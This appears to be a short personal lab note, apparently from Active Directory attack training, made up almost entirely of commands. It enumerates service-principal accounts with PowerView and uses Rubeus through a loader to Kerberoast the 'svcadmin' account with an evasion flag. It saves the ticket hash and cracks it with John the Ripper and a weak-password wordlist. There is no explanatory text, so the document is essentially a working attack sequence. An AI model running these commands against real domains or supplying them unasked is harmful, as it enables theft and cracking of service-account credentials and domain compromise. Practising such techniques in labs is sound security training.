
![[Pasted image 20250621175917.png]]

```
Get-DomainUser -SPN
```

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec
```

```
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin/simple/rc4opsec /outfile: C:\AD\Tools\hashes.txt
```

```
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```


